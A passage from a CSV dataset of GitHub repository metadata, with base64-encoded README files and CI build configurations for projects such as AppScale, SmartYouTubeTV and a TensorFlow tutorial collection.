name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
IHRpbWUgdG8gY29udGludWUgdG8gd29yayBvbiB0aGlzLiBPcGVuIGFuIGlz
c3VlIGlmIHlvdSdyZSBpbnRlcmVzdGVkLgoKdGhpcyBicmFuY2ggcmVwcmVz
ZW50cyB0aGUgbGF0ZXN0ICpiZXRhKiB2ZXJzaW9uLiB0aGUgc3RhYmxlIHZl
cnNpb24gY2FuIGJlIGZvdW5kIGluIHRoZSBsZWdhY3kgYnJhbmNoLgoKIyMg
QnVpbGRpbmcKCmluc3RhbGwgZGVwZW5kZW5jaWVzCgpgYGBzaApicmV3IGlu
c3RhbGwgb3BhbSBnb2xhbmcgbGliZXYKb3BhbSBpbml0CmV2YWwgYG9wYW0g
Y29uZmlnIGVudmAKb3BhbSBpbnN0YWxsIHVyaSBxY293LjAuNy4wIGNvbmYt
bGliZXYgbG9ncyBmbXQgcWNvdy1mb3JtYXQKZ28gZ2V0IC11IGdpdGh1Yi5j
b20vanRlZXV3ZW4vZ28tYmluZGF0YS8uLi4KZ2l0IHN1Ym1vZHVsZSBpbml0
CmdpdCBzdWJtb2R1bGUgdXBkYXRlCmBgYAoKdXBkYXRlIGRlcGVuZGVuY2ll
cyAodXNlIHRoaXMgaWYgeW91J3ZlIGFscmVhZHkgYnVpbHQgdGhlIHByb2pl
Y3QgYmVmb3JlKQoKYGBgc2gKZ2l0IHN1Ym1vZHVsZSBmb3JlYWNoIGdpdCBw
dWxsIG9yaWdpbiBtYXN0ZXIKb3BhbSB1cGRhdGUKb3BhbSB1cGdyYWRlCmBg
YAoKYnVpbGQgdGhlIGJpbmFyeQoKYGBgc2gKZ28gZ2VuZXJhdGUKZ28gYnVp
bGQKYGBgCg==
",,"b3M6IG9zeApsYW5ndWFnZTogZ28Kb3N4X2ltYWdlOiB4Y29kZTgKCmJlZm9y
ZV9pbnN0YWxsOgogIC0gYnJldyB1cGRhdGUKICAtIGJyZXcgb3V0ZGF0ZWQg
Z29sYW5nIHx8IGJyZXcgdXBncmFkZSBnb2xhbmcKICAtIGJyZXcgaW5zdGFs
bCBvcGFtIGxpYmV2CiAgLSBvcGFtIGluaXQgLXkKICAtIGdvIHZlcnNpb24K
Cmluc3RhbGw6CiAgLSBldmFsIGBvcGFtIGNvbmZpZyBlbnZgCiAgLSBvcGFt
IGluc3RhbGwgLXkgdXJpIHFjb3cuMC43LjAgY29uZi1saWJldiBsb2dzIGZt
dAogIC0gZ28gZ2V0IC11IGdpdGh1Yi5jb20vanRlZXV3ZW4vZ28tYmluZGF0
YS8uLi4KCnNjcmlwdDoKICAtIGdvIGdlbmVyYXRlCiAgLSBnbyBidWlsZAog
IC0gLi9kbGl0ZSAtLXZlcnNpb24gfHwgdHJ1ZQoKbm90aWZpY2F0aW9uczoK
ICBlbWFpbDoKICAgIG9uX3N1Y2Nlc3M6IG5ldmVyCiAgICBvbl9mYWlsdXJl
OiBhbHdheXMK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'appscale',3803067,b'AppScale is an easy-to-manage serverless platform for building and running scalable web and mobile applications on any infrastructure.',b'Python',54,2394,,2394,False,b'https://api.github.com/repos/AppScale/appscale/forks',"IyBBcHBTY2FsZQoKWyFbR2l0SHViIHZlcnNpb25dKGh0dHBzOi8vYmFkZ2Uu
ZnVyeS5pby9naC9BcHBTY2FsZSUyRmFwcHNjYWxlLnN2ZyldKGh0dHA6Ly9i
YWRnZS5mdXJ5LmlvL2doL0FwcFNjYWxlJTJGYXBwc2NhbGUpClshW0FwcFNj
YWxlIGxpY2Vuc2VdKGh0dHBzOi8vaW1nLnNoaWVsZHMuaW8vYmFkZ2UvbGlj
ZW5zZS1BcGFjaGUlMjAyLWJsdWUuc3ZnKV0oaHR0cHM6Ly9naXRodWIuY29t
L0FwcFNjYWxlL2FwcHNjYWxlL2Jsb2IvbWFzdGVyL0xJQ0VOU0UpCgpBcHBT
Y2FsZSBpcyBhbiBlYXN5LXRvLW1hbmFnZSBzZXJ2ZXJsZXNzIHBsYXRmb3Jt
IGZvciBidWlsZGluZyBhbmQgcnVubmluZyBzY2FsYWJsZSB3ZWIgYW5kIG1v
YmlsZSBhcHBsaWNhdGlvbnMgb24gYW55IGluZnJhc3RydWN0dXJlLiAKClRo
ZSBwbGF0Zm9ybSBlbmFibGVzIGRldmVsb3BlcnMgdG8gZm9jdXMgc29sZWx5
IG9uIGJ1c2luZXNzIGxvZ2ljIGluIG9yZGVyIHRvIHJhcGlkbHkgYnVpbGQg
c2NhbGFibGUgYXBwcywgY2xlYW5seSBzZXBhcmF0aW5nIGl0IGZyb20gZGVw
bG95bWVudCBhbmQgc2NhbGluZyBsb2dpYy4gSXQgYWxsb3dzIG9wZXJhdGlv
bnMgdG8gcHJvdmlkZSBhIGNvbnNpc3RlbnQsIHR1bmFibGUgZW52aXJvbm1l
bnQgdGhhdCBjYW4gc2ltcGxpZnkgcnVubmluZyBhbmQgbWFpbnRhaW5pbmcg
YXBwcyBvbiBtdWx0aXBsZSBpbmZyYXN0cnVjdHVyZXMuIFRoZSBidXNpbmVz
cyB3aWxsIGJlbmVmaXQgZnJvbSBmYXN0ZXIgdGltZS10by1tYXJrZXQsIHJl
ZHVjZWQgb3BlcmF0aW9uYWwgY29zdHMsIG1heGltaXplZCBhcHBsaWNhdGlv
biBsaWZldGltZSwgYW5kIHRoZSBmbGV4aWJpbGl0eSB0byBpbnRlZ3JhdGUg
d2l0aCBuZXcgb3IgZXhpc3RpbmcgdGVjaG5vbG9naWVzLgoKQXBwU2NhbGUg
aXMgb3BlbiBzb3VyY2UgYW5kIG1vZGVsZWQgb24gR29vZ2xlIEFwcCBFbmdp
bmUgQVBJcywgYWxsb3dpbmcgZGV2ZWxvcGVycyB0byBhdXRvbWF0aWNhbGx5
IGRlcGxveSBhbmQgc2NhbGUgdW5tb2RpZmllZCBHb29nbGUgQXBwIEVuZ2lu
ZSBhcHBsaWNhdGlvbnMgb3ZlciBwdWJsaWMgYW5kIHByaXZhdGUgY2xvdWQg
c3lzdGVtcyBhbmQgb24tcHJlbWlzZSBjbHVzdGVycy4gSXQgY3VycmVudGx5
IHN1cHBvcnRzIFB5dGhvbiwgR28sIFBIUCBhbmQgSmF2YSBhcHBsaWNhdGlv
bnMuIFRoZSBzb2Z0d2FyZSBpcyBkZXZlbG9wZWQgYW5kIG1haW50YWluZWQg
YnkgQXBwU2NhbGUgU3lzdGVtcywgSW5jLiwgYmFzZWQgaW4gU2FudGEgQmFy
YmFyYSwgQ2FsaWZvcm5pYSwgYW5kIEdvb2dsZS4KCgojIyBXaHkgVXNlIEFw
cFNjYWxlPwpUaGUgZ29hbCBvZiBBcHBTY2FsZSBpcyB0byBwcm92aWRlIGRl
dmVsb3BlcnMgd2l0aCBhIHJhcGlkLCBBUEktZHJpdmVuIGRldmVsb3BtZW50
IHBsYXRmb3JtIHRoYXQgY2FuIHJ1biBhcHBsaWNhdGlvbnMgb24gYW55IGNs
b3VkIGluZnJhc3RydWN0dXJlLiBBcHBTY2FsZSBkZWNvdXBsZXMgYXBwbGlj
YXRpb24gbG9naWMgZnJvbSBpdHMgc2VydmljZSBlY29zeXN0ZW0gdG8gZ2l2
ZSBkZXZlbG9wZXJzIGFuZCBjbG91ZCBhZG1pbmlzdHJhdG9ycyBjb250cm9s
IG92ZXIgYXBwbGljYXRpb24gZGVwbG95bWVudCwgZGF0YSBzdG9yYWdlLCBy
ZXNvdXJjZSB1c2UsIGJhY2t1cCwgYW5kIG1pZ3JhdGlvbi4KCgojIyBJIFdh
bnQgLi4uCiogdG8gW2NvbnRyaWJ1dGVdKGh0dHBzOi8vZ2l0aHViLmNvbS9B
cHBTY2FsZS9hcHBzY2FsZS93aWtpL0NvbnRyaWJ1dGUlMjEpCiogdG8gW3Ry
eSBBcHBTY2FsZV0oaHR0cHM6Ly93d3cuYXBwc2NhbGUuY29tL2dldC1zdGFy
dGVkLykKKiB0byBzZWUgW2hvdyBvdGhlciBwZW9wbGUgdXNlIEFwcFNjYWxl
XShodHRwczovL3d3dy5hcHBzY2FsZS5jb20vd2h5LWFwcHNjYWxlLykKKiBb
Y3VzdG9tZXIgc3VwcG9ydF0oaHR0cHM6Ly93d3cuYXBwc2NhbGUuY29tL3By
b2R1Y3RzL2FwcHNjYWxlLWN1c3RvbWVyLXN1Y2Nlc3MvKQoqIHRvIFtsZWFy
biBtb3JlXShodHRwczovL2dpdGh1Yi5jb20vQXBwU2NhbGUvYXBwc2NhbGUv
d2lraSkKCgojIyBEb2N1bWVudGF0aW9uCiogR2V0dGluZyBTdGFydGVkCiAg
KiBbQXBwU2NhbGUgRmFzdFN0YXJ0XShodHRwczovL3d3dy5hcHBzY2FsZS5j
b20vZ2V0LXN0YXJ0ZWQvKQogICogW0RlcGxveW1lbnQgdHlwZXNdKGh0dHBz
Oi8vd3d3LmFwcHNjYWxlLmNvbS9nZXQtc3RhcnRlZC9kZXBsb3ltZW50LXR5
cGVzLykKICAqIFtEZXBsb3kgQXBwU2NhbGVdKGh0dHBzOi8vd3d3LmFwcHNj
YWxlLmNvbS9nZXQtc3RhcnRlZC9kZXBsb3ktYXBwc2NhbGUvKQoqIFVzZXJz
CiAgKiBbTWFuYWdpbmcgQXBwcyBhbmQgQXBwU2NhbGVdKGh0dHBzOi8vd3d3
LmFwcHNjYWxlLmNvbS9nZXQtc3RhcnRlZC9tYW5hZ2VtZW50LykKICAqIFtB
dXRvbWF0ZWQgRGF0YSBQZXJzaXN0ZW5jZV0oaHR0cHM6Ly9naXRodWIuY29t
L0FwcFNjYWxlL2FwcHNjYWxlL3dpa2kvQXV0b21hdGVkLURhdGEtUGVyc2lz
dGVuY2UpCiAgKiBbTXVsdGlub2RlIERlcGxveW1lbnRzXShodHRwczovL2dp
dGh1Yi5jb20vQXBwU2NhbGUvYXBwc2NhbGUvd2lraS9EaXN0cmlidXRlZC1E
ZXBsb3ltZW50KQogICogW01ha2luZyBBcHBTY2FsZSBTY2FsZV0oaHR0cHM6
Ly9naXRodWIuY29tL0FwcFNjYWxlL2FwcHNjYWxlL3dpa2kjbWFraW5nLWFw
cHNjYWxlLXNjYWxlKQoqIERldmVsb3BlcnMKICAqIFtEYXRhc3RvcmUgVG9w
aWNzXShodHRwczovL2dpdGh1Yi5jb20vQXBwU2NhbGUvYXBwc2NhbGUvd2lr
aSNkYXRhc3RvcmUtdG9waWNzKQogICogW0FkdmFuY2VkIFRvcGljc10oaHR0
cHM6Ly9naXRodWIuY29tL0FwcFNjYWxlL2FwcHNjYWxlL3dpa2kjYWR2YW5j
ZWQtdG9waWNzKQoqIEFyY2hpdGVjdHVyZQogICogQXBwU2NhbGUncyBbY29y
ZSBjb21wb25lbnRzXShodHRwczovL2dpdGh1Yi5jb20vQXBwU2NhbGUvYXBw
c2NhbGUvd2lraSNsZWFybi1hYm91dC1hcHBzY2FsZS1jb3JlLWNvbXBvbmVu
dHMpCiogW0ZBUXNdKGh0dHBzOi8vZ2l0aHViLmNvbS9BcHBTY2FsZS9hcHBz
Y2FsZS93aWtpL0ZBUXMpIGFuZCBbVHJvdWJsZXNob290aW5nXShodHRwczov
L2dpdGh1Yi5jb20vQXBwU2NhbGUvYXBwc2NhbGUvd2lraS9Ucm91Ymxlc2hv
b3RpbmcpCgojIyBDb21tdW5pdHkgYW5kIFN1cHBvcnQKSm9pbiB0aGUgW0Nv
bW11bml0eSBHb29nbGUgR3JvdXBdKGh0dHA6Ly9ncm91cHMuZ29vZ2xlLmNv
bS9ncm91cC9hcHBzY2FsZV9jb21tdW5pdHkpIGZvciBhbm5vdW5jZW1lbnRz
LCBoZWxwLCBhbmQgdG8gZGlzY3VzcyBjbG91ZCByZXNlYXJjaC4KCkFsc28s
IGpvaW4gdXMgb24gWyNhcHBzY2FsZSBvbiBmcmVlbm9kZV0oaHR0cDovL3dl
YmNoYXQuZnJlZW5vZGUubmV0Lz9jaGFubmVscz1hcHBzY2FsZSZ1aW89ZDQp
IGlmIHlvdSBoYXZlIHF1ZXN0aW9ucywgc3VnZ2VzdGlvbnMsIGNvbW1lbnRz
LCBvciBqdXN0IHdhbnQgdG8gc2F5IGhpIQo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'SmartYouTubeTV',77243612,b'Watch YouTube videos on your TV and set-top-box with comfort',b'Java',117,2394,,2394,False,b'https://api.github.com/repos/yuliskov/SmartYouTubeTV/forks',"IVtMb2dvIG9mIFNtYXJ0WW91VHViZVRWXShzY3JlZW5zaG90cy9zbWFydHlv
dXR1YmV0di1sb2dvX3NtYWxsLnBuZyAiTG9nbyBvZiBTbWFydFlvdVR1YmVU
ViIpIFNtYXJ0WW91VHViZVRWCj09PT09PT09PQoKWyFbTVBMdjIgTGljZW5z
ZV0oaHR0cDovL2ltZy5zaGllbGRzLmlvL2JhZGdlL2xpY2Vuc2UtTVBMdjIt
Ymx1ZS5zdmc/c3R5bGU9ZmxhdC1zcXVhcmUpXShodHRwczovL3d3dy5tb3pp
bGxhLm9yZy9NUEwvMi4wLykKCl9fU21hcnRZb3VUdWJlVFY6IEEgWW91VHVi
ZSBjbGllbnQgZm9yIHNldC10b3AgYm94ZXMgYW5kIEFuZHJvaWQtYmFzZWQg
VFZzOl9fCgogKiA8YSBocmVmPSJodHRwczovL3QubWUvU21hcnRZb3VUdWJl
VFYiPlRlbGVncmFtIGdyb3VwPC9hPgogKiA8YSBocmVmPSJodHRwczovL3Nt
YXJ0eW91dHViZXR2LmdpdGh1Yi5pby8jY29tbWVudC0zNDMyNDg0MTI5IiB0
YXJnZXQ9Il9ibGFuayI+VmlzaXQgZGlzY3Vzc2lvbiBvbiB0aGUgb2ZmaWNp
YWwgcGFnZTwvYT4KCiMjIyBGZWF0dXJlczoKCiAqIF9fNEsgc3VwcG9ydC5f
XwogKiBEZXNpZ25lZCBmb3IgVFYgc2NyZWVucy4KICogQW55IHJlbW90ZSBj
b250cm9sbGVyIHN1cHBvcnQuCiAqIExvZ2luIHN1cHBvcnQuCiAqIERvZXNu
J3QgZGVwZW5kIG9uIEdvb2dsZSBTZXJ2aWNlcy4KICogRnVsbHkgbG9jYWxp
emVkLgogKiBNdWx0aWxpbmd1YWwgc2VhcmNoIGtleWJvYXJkLgogKiBBdXRv
bWF0aWMgdXBkYXRlIG1lY2hhbmlzbS4KICogX19ObyByb290IHJlcXVpcmVk
IV9fCgpfX05PVEU6IFNtYXJ0WW91VHViZVRWIHByb3ZpZGVzIGludGVybmFs
IGxvZ2luIG1lY2hhbmlzbSB3aGljaCBhbGxvd3MgeW91IHRvIGtlZXAgY29u
dGVudCB1cCB0byBkYXRlIGluIGEgdmVyeSBjb252ZW5pZW50IHdheS5fXwoK
IyMjIFNjcmVlbnNob3RzOgogKiBbT3BlbiBzY3JlZW5zaG90c10oI3NjcmVl
bnMpCgojIyMgSW5zdGFsbCBTbWFydFlvdVR1YmVUVjoKCl9fRWFzeSBpbnN0
YWxsYXRpb24gaW4gbGVzcyB0aGFuIDUgbWludXRlcyB3aXRoIG9ubHkgdGhl
IEZpcmVUVl9fCiAqIDxhIGhyZWY9Imh0dHBzOi8vZ2l0aHViLmNvbS95dWxp
c2tvdi9TbWFydFlvdVR1YmVUVi93aWtpL0luc3RhbGwtU21hcnRZb3VUdWJl
VFYtKG9ubHktRmlyZVRWLW5lZWRlZCkiPkluc3RhbGwgU21hcnRZb3VUdWJl
VFYgKG9ubHkgRmlyZVRWIG5lZWRlZCk8L2E+CgpfX1N0YW5kYXJkIGluc3Rh
bGxhdGlvbiB2aWEgQURCX18KICogSWYgeW91IGRvbid0IGtub3cgaG93IHRv
IHNpZGVsb2FkL2luc3RhbGwgYXBwcyB2aWEgQURCLCByZWFkIGEgdHV0b3Jp
YWwgKGUuZy4gPGEgaHJlZj0iaHR0cDovL2tvZGkud2lraS92aWV3L0hPVy1U
TzpJbnN0YWxsX0tvZGlfb25fRmlyZV9UViIgdGFyZ2V0PSJfYmxhbmsiPnRo
aXMgb25lPC9hPikKICogPGEgaHJlZj0iaHR0cHM6Ly9naXRodWIuY29tL3l1
bGlza292L1NtYXJ0WW91VHViZVRWL3JlbGVhc2VzIiB0YXJnZXQ9Il9ibGFu
ayI+RG93bmxvYWQgbGF0ZXN0IFNtYXJ0WW91VHViZVRWIEFQSzwvYT4gYW5k
IHNpZGVsb2FkL2luc3RhbGwgd2l0aCBhZGI6IAogKiAqYWRiIGluc3RhbGwg
LXIgU21hcnRZb3VUdWJlVFZfT3JpZy5hcGsqCiAqIEVuam95IDopCgpfX0hv
dyB0byBjaGFuZ2Ugc3lzdGVtIGxhbmd1YWdlIHdpdGggb25seSB0aGUgTWlU
VjNfXwogKiBbSG93LXRvLWVuYWJsZS1FbmdsaXNoLW9uLUFuZHJvaWQtNS4x
XShodHRwczovL2dpdGh1Yi5jb20veXVsaXNrb3YvU21hcnRZb3VUdWJlVFYv
d2lraS9Ib3ctdG8tZW5hYmxlLUVuZ2xpc2gtb24tQW5kcm9pZC01LjEpCgoj
IyMgU3RhcnRpbmcgc2NyZWVuOgoKVGhlIGRldmljZS9yZXNvbHV0aW9uIG9w
dGlvbnMgYXQgc3RhcnQgbGF1bmNoZXMgZGlmZmVyZW50IHBsYXlpbmcgbWV0
aG9kcyAoYXMgcGVyIGh0dHBzOi8vZ2l0aHViLmNvbS95dWxpc2tvdi9TbWFy
dFlvdVR1YmVUVi9pc3N1ZXMvMTUjaXNzdWVjb21tZW50LTM2NDgwNTk1MCkK
KiAxMDgwIE1haW4gLSBXZWJWaWV3CiogMTA4MCBBbHQgIC0gWFdhbGsKKiA0
SyBNYWluICAgLSBFeG9wbGF5ZXIgKyBXZWJWaWV3CiogNEsgQWx0ICAgIC0g
RXhvcGxheWVyICsgWFdhbGsKCkFsc28gaW1wb3J0YW50LCBpdCdzIHBvc3Np
YmxlIHRvIHNlbGVjdCBtYXggcmVzb2x1dGlvbiBhbmQgY29kZWMgKGllIDEw
ODAvQVZDMSkgdmlhIHRoZSBzdGFydCBzY3JlZW4gdGhhdCB3aWxsIGJlIGFw
cGxpZWQgb24gdmlkZW8gbG9hZGluZyAoKipDb2RlYyoqIG9wdGlvbikuCgpU
aGUgKipSZW1lbWJlcioqIHRpY2sgYm94IGFjdHMgYXMgYSBjb25maWd1cmF0
aW9uIHNhdmluZyBmb3IgbmV4dCBhcHAgbGF1bmNoZXMuCgojIyMgRG9uYXRp
b246CklmIHlvdSB3YW50IHRvIHN1cHBvcnQgbXkgZGV2ZWxvcG1lbnRzIHlv
dSBhcmUgd2VsY29tZSB0byBidXkgbWUgYSBjdXAgb2YgY29mZmVlIDopCiAq
IFtfX0RvbmF0aW9uIEFsZXJ0cyAoUlUsIFBheVBhbClfX10oaHR0cHM6Ly93
d3cuZG9uYXRpb25hbGVydHMucnUvci9maXJzdGhhc2gpCiAqIFtfX1ByaXZh
dEJhbmsgKFVBKV9fXShodHRwczovL3ByaXZhdGJhbmsudWEvcnUvc2VuZG1v
bmV5P3BheW1lbnQ9NWZjZGRkZjUzZTNkNDkxZDYzZmNiMDUwZTZlMmUwNWYy
ZjI2NzhjMikKICogX19CVENfXzogMUpBVDVWVldhclZCa3BWYk5EbjhVQThI
WE5kcnVrdUJTeAogCiMjIyBSZXZpZXdzIC8gQXJ0aWNsZXM6CiAqIFtfX09m
ZmljaWFsIHNpdGVfX10oaHR0cHM6Ly9zbWFydHlvdXR1YmV0di5naXRodWIu
aW8pCiAqIFtfX1hEQSB0aHJlYWRfX10oaHR0cHM6Ly9mb3J1bS54ZGEtZGV2
ZWxvcGVycy5jb20vZmlyZS10di90aGVtZXMtYXBwcy9tb2RpZmllZC12ZXJz
aW9uLXNtYXJ0LXlvdXR1YmUtdHYtdDM3NzMzODQpCiAKIyMjIENoYW5nZWxv
ZzoKICogW0NoZWNrIHJlbGVhc2VzIHBhZ2UgZm9yIGNoYW5nZWxvZyAuLl0o
aHR0cHM6Ly9naXRodWIuY29tL3l1bGlza292L1NtYXJ0WW91VHViZVRWL3Jl
bGVhc2VzKQoKIyMjIENvbnRyaWJ1dG9yczoKICogX19bV29sZmdhblBdKGh0
dHBzOi8vZ2l0aHViLmNvbS9Xb2xmZ2FuUClfXyAoUkVBRE1FKQogKiBfX1tq
YXZpZXJwel0oaHR0cHM6Ly9naXRodWIuY29tL2phdmllcnB6KV9fIChjYXN0
IGZpeCkKICogX19bVGhlUk1hdmVyaWNrXShodHRwczovL2dpdGh1Yi5jb20v
VGhlUk1hdmVyaWNrKV9fIChHZXJtYW4gbGFuZ3VhZ2UpCiAqIF9fW01haWtl
bGw4NF0oaHR0cHM6Ly9naXRodWIuY29tL01haWtlbGw4NClfXyAobWlzYyBm
aXhlcykKCiMjIyBTY3JlZW5zOgohW1NjcmVlbnNob3Qgb2YgU21hcnRZb3VU
dWJlVFZdKHNjcmVlbnNob3RzL3NtYXJ0eW91dHViZXR2X3NjcmVlbnNob3Rf
MDEuanBnICJTY3JlZW5zaG90IG9mIFNtYXJ0WW91VHViZVRWIikKIVtTY3Jl
ZW5zaG90IG9mIFNtYXJ0WW91VHViZVRWXShzY3JlZW5zaG90cy9zbWFydHlv
dXR1YmV0dl9zY3JlZW5zaG90XzAyLmpwZyAiU2NyZWVuc2hvdCBvZiBTbWFy
dFlvdVR1YmVUViIpCiFbU2NyZWVuc2hvdCBvZiBTbWFydFlvdVR1YmVUVl0o
c2NyZWVuc2hvdHMvc21hcnR5b3V0dWJldHZfc2NyZWVuc2hvdF8wMy5qcGcg
IlNjcmVlbnNob3Qgb2YgU21hcnRZb3VUdWJlVFYiKQohW1NjcmVlbnNob3Qg
b2YgU21hcnRZb3VUdWJlVFZdKHNjcmVlbnNob3RzL3NtYXJ0eW91dHViZXR2
X3NjcmVlbnNob3RfMDQuanBnICJTY3JlZW5zaG90IG9mIFNtYXJ0WW91VHVi
ZVRWIikKIVtTY3JlZW5zaG90IG9mIFNtYXJ0WW91VHViZVRWXShzY3JlZW5z
aG90cy9zbWFydHlvdXR1YmV0dl9zY3JlZW5zaG90XzA1LmpwZyAiU2NyZWVu
c2hvdCBvZiBTbWFydFlvdVR1YmVUViIp
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'Tensorflow-101',58386168,b'TensorFlow Tutorials',b'Jupyter Notebook',14,2393,,2393,False,b'https://api.github.com/repos/sjchoi86/Tensorflow-101/forks',"IyBUZW5zb3JmbG93IFR1dG9yaWFscyB1c2luZyBKdXB5dGVyIE5vdGVib29r
IAoKVGVuc29yRmxvdyB0dXRvcmlhbHMgd3JpdHRlbiBpbiBQeXRob24gKG9m
IGNvdXJzZSkgd2l0aCBKdXB5dGVyIE5vdGVib29rLiBUcmllZCB0byBleHBs
YWluIGFzIGtpbmRseSBhcyBwb3NzaWJsZSwgYXMgdGhlc2UgdHV0b3JpYWxz
IGFyZSBpbnRlbmRlZCBmb3IgVGVuc29yRmxvdyBiZWdpbm5lcnMuIEhvcGUg
dGhlc2UgdHV0b3JpYWxzIHRvIGJlIGEgdXNlZnVsIHJlY2lwZSBib29rIGZv
ciB5b3VyIGRlZXAgbGVhcm5pbmcgcHJvamVjdHMuIEVuam95IGNvZGluZyEg
OikgCgojIyBDb250ZW50cwoxLiBCYXNpY3Mgb2YgW1RlbnNvckZsb3ddKGh0
dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni90ZW5zb3JmbG93LTEwMS9ibG9i
L21hc3Rlci9ub3RlYm9va3MvYmFzaWNfdGVuc29yZmxvdy5pcHluYikgLyBb
TU5JU1RdKGh0dHBzOi8vZ2l0aHViLmNvbS9zamNob2k4Ni90ZW5zb3JmbG93
LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9va3MvYmFzaWNfbW5pc3QuaXB5bmIp
IC8gW051bXB5XShodHRwczovL2dpdGh1Yi5jb20vc2pjaG9pODYvVGVuc29y
Zmxvdy0xMDEvYmxvYi9tYXN0ZXIvbm90ZWJvb2tzL2Jhc2ljX3B5dGhvbi5p
cHluYikgIC8gW0ltYWdlIFByb2Nlc3NpbmddKGh0dHBzOi8vZ2l0aHViLmNv
bS9zamNob2k4Ni90ZW5zb3JmbG93LTEwMS9ibG9iL21hc3Rlci9ub3RlYm9v
a3MvYmFzaWNfaW1ncHJvY2Vzcy5pcHluYikgLyBbR2VuZXJhdGluZyBDdXN0
b20gRGF0YXNldF0oaHR0cHM6Ly9naXRodWIuY29tL3NqY2hvaTg2L3RlbnNv
cmZsb3ctMTAxL2Jsb2IvbWFzdGVyL25vdGVib29rcy9iYXNpY19nZW5kYXRh
c2V0LmlweW5iKQoyLiBNYWNoaW5lIExlYXJpbmcgQmFzaWNzIHdpdGggVGVu
c29yRmxvdzogW0xpbmVhciBSZWdyZXNzaW9uXShodHRwczovL2dpdGh1Yi5j
b20vc2pjaG9pODYvdGVuc29yZmxvdy0xMDEvYmxvYi9tYXN0ZXIvbm90ZWJv
